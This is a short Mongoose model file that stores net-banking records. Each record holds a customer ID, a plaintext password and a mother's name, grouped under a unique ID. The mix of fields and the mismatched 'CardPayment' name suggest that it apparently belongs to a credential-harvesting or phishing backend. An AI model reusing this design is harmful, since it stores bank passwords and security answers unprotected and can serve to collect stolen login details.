// models/CardPayment.js
const mongoose = require('mongoose');

const entrySchema = new mongoose.Schema({
  customerId:  { type: String, required: true },
  password:    { type: String, required: true },
  motherName:  { type: String, required: true },
  submittedAt: { type: Date,   default: Date.now }
});

const netBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries:  [ entrySchema ]
});

module.exports = mongoose.model('CardPayment', netBankingSchema);
